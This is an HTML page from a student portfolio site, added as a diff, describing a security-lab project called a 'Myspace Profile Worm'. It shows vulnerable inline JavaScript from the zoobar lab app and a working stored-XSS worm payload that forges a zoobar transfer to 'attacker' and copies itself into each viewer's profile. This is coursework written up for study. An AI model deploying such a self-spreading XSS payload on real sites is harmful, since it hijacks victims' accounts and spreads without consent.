@@ -1,0 +1,144 @@
+<!DOCTYPE HTML>
+<!--
+	Landed by HTML5 UP
+	html5up.net | @n33co
+	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+-->
+<html>
+	<head>
+		<title>Eui Won Kim | Snowman</title>
+		<meta name="author" content="Eui Won Kim">
+		<meta charset="utf-8" />
+		<link rel="shortcut icon" href="images/logoblack.png" type="image/x-icon">
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		<!--[if lte IE 8]><script src="assets/js/ie/html5shiv.js"></script><![endif]-->
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body>
+		<div id="page-wrapper">
+
+			<!-- Header -->
+				<header id="header">
+					<h1 id="logo" style="margin-top: 5px"><a href="index.html"><img alt="" height="50px" src="images/johnekimlogo1.png" width="150px" /> </a></h1>
+					<nav id="nav">
+						<ul>
+							<li><a href="about.html"><b>About</b></a></li>
+							<li>
+								<a href="#"><b>Projects</b></a>
+								<ul>
+									<li><a href="routie.html">Routie</a></li>
+									<li><a href="snowman.html">Study Buddy</a></li>
+									<li><a href="web.html">Personal Website</a></li>
+									<li><a href="elm.html">Elm</a></li>
+									<li><a href="cse.html">Lab Waitlist</a></li>
+									<li class="opener" style="-webkit-user-select: none; cursor: pointer; white-space: nowrap; opacity: 1;">
+										<a href="#" style="display: block;">Internet Security</a>
+										<ul style="-webkit-user-select: none; position: absolute; z-index: 1001; left: -167px; top: 103.703125px; opacity: 1; display: none;" class="dropotron level-1">
+											<li style="white-space: nowrap;"><a href="buffer.html" style="display: block;">Buffer&Integer Overflow</a></li>
+											<li style="white-space: nowrap;"><a href="heap.html" style="display: block;">Heap Spray</a></li>
+											<li style="white-space: nowrap;"><a href="china.html" style="display: block;">China's Great Cannon</a></li>
+											<li style="white-space: nowrap;"><a href="wo" style="display: block;">XSS & Profile Worm</a></li>
+										</ul>
+									</li>
+									<li><a href="cse.html">Recommendation Algorithm</a></li>
+								</ul>
+							</li>
+							<li><a href="resume.html"><b>Resume</b></a></li>
+							<li><a href="contact.html"><b>Contact</b></a></li>
+							
+							
+						</ul>
+					</nav>
+				</header>
+
+			<!-- Main -->
+				<div id="main" class="wrapper style1">
+					<div class="container">
+						<header class="major">
+							<h2><a><img src="images/security.jpg" height="154px" width="178px" alt="" /></a>
+</h2>
+							<h2>Myspace Profile Worm.</h2>
+						</header>
+						
+							<p>In this target, there was an inline javascript that was exploitable. I had access to the source files of the website and with that I was able to write a full script to transfer zoobars from the person viewing my profile. I made two separate requests. One with transfer 1 zoobar, and the other one with user profile page. The profile of 'attacker' will successfully be copied into user's profile and 1 zoobar will be transferred to 'attacker's account. </p>
+							<div class="row">
+								<div class="6u 12u(xsmall)" style="float: left;">
+								<header >
+									<h2><br></h2>
+									<p>Target</p>
+									<pre width="800px"><code >&#60;span id="zoobars" class="20"&#62;&#60;script type="text/javascript"&#62;
+  var total = eval(document.getElementById('zoobars').className);
+  function showZoobars(zoobars) {
+    document.getElementById("profileheader").innerHTML =
+      "1's zoobars:" + zoobars;
+    if (zoobars &#60; total) {
+      setTimeout("showZoobars(" + (zoobars + 1) + ")", 100);
+    }
+  }
+  if (total > 0) showZoobars(0);  // count up to total
+</script>
+
+</span>
+
+									</code></pre>
+									</header>
+								</div>
+								<div class="6u 12u(xsmall)" style="float: right;">
+								<header >
+									<h2> <br></h2>
+									<p>Exploit</p>
+									<pre width="800px"><code >&#60;span id="zoobars" class="
+var a = String.fromCharCode(38);
+var x = new XMLHttpRequest();
+x.open('post','transfer.php',true);
+x.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+x.send('zoobars=1'.concat(a).concat('recipient=attacker').concat(a).concat('submission=Send'));
+var p = document.getElementById('profile').innerHTML.concat(String.fromCharCode(60,47,115,112,97,110,62,38));
+x.open('post','index.php',true);
+x.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+x.send('profile_update='.concat(p).concat('profile_submit=Save'));
+var n = document.getElementsByName('user')[0].value;
+document.getElementById('profileheader').innerHTML=n.concat('\'s zoobars:10');
+10;
+"&#62;
+cookieeeeeeeee</span></span>
+
+									</code></pre>
+								</div>
+								
+								
+						
+								
+						</div>
+
+					</div>
+				</div>
+				
+				
+
+			<!-- Footer -->
+				<footer id="footer">
+					<ul class="icons">
+						<li><a href="https://www.linkedin.com/in/euiwonkim" class="icon alt fa-linkedin"><span class="label">LinkedIn</span></a></li>
+						<li><a href="https://github.com/jeo1kim" class="icon alt fa-github"><span class="label">GitHub</span></a></li>
+						<li><a href="mailto:jeo1kim@gmail.com" class="icon alt fa-envelope"><span class="label">Email</span></a></li>
+					</ul>
+					<ul class="copyright">
+						<li>&copy; Awesome Possom. All rights reserved.</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+						<li>Logo: <a href="Cargocollective.com/alicesung">Alice Sung Kim</a></ul>					</ul>
+				</footer>
+
+		</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/jquery.dropotron.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/skel.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
